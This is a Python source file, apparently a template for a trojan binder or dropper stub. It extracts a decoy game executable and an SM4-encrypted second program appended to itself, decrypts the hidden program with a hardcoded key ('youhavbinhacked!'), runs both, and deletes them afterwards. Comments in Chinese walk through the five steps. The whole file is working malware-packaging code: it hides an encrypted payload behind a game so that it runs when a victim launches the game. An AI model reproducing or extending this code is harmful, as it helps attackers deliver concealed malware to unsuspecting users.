
import subprocess
import threading
import os
import sys
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
####################################################
self_size={size_old}
game_size={gamefile_size} 
cus_path=''#自定义路径
#
crypt_sm4=CryptSM4()
secret_key='youhavbinhacked!'.encode()
#######################################
def SM4_decrypt(ciphertext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #解密
    crypt_sm4.set_key(secret_key, SM4_DECRYPT)
    decrypted_text = crypt_sm4.crypt_ecb(ciphertext)
    #返回
    return decrypted_text
####################################################
def decrypt_file(path,out):
    file=open(path,'rb')
    data=file.read()
    file.close()
    data_enc=SM4_decrypt(data)
    file2=open(out,'wb')
    file2.write(data_enc)
    file2.close()
def thread_(path):
    subprocess.call(path)
    os.remove(path)
    return 0
####################################################
#第一步，获取自身的位置
def get_self_name():
    self_path=os.path.abspath(sys.argv[0])
    return self_path
#第二步，分离程序
def get_separate(self_path):
    fself=open(self_path,'rb')
    data=fself.read()
    fself.close()
    fgame=open(cus_path+'gamedata.dll','wb')
    fgame.write(data[self_size:self_size+game_size])
    fgame.close()
    fscript=open(cus_path+'encdata','wb')
    fscript.write(data[self_size+game_size:])
    fscript.close()
    #此时获得两个二进制文件
    return 1
#第三步，运行游戏程序
def start_game():
    thread1 = threading.Thread(target=thread_,args=(cus_path+'gamedata.dll',))
    thread1.start()
#第四步，解密脚本程序
def get_C():
    path=cus_path+'encdata'
    out=cus_path+'scriptdata.dll'
    decrypt_file(path,out)
#第五步，运行脚本程序
def start_script():
    thread2 = threading.Thread(target=thread_,args=(cus_path+'scriptdata.dll',))
    thread2.start()

####################################################
#运行区域
self_path=get_self_name()
get_separate(self_path)
start_game()
get_C()
start_script()
